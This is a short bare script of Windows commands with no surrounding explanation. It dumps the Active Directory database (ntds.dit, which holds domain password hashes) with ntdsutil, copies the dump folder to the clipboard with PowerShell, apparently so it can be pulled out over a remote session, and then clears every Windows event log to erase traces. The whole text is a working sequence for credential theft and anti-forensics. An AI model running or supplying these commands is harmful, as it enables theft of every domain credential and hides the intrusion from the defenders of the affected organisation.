ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\NTSD' q q

Add-Type -AssemblyName System.Windows.Forms
$f = New-Object System.Collections.Specialized.StringCollection
$f.Add('C:\Windows\NTSD')
[System.Windows.Forms.Clipboard]::SetFileDropList($f)

Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
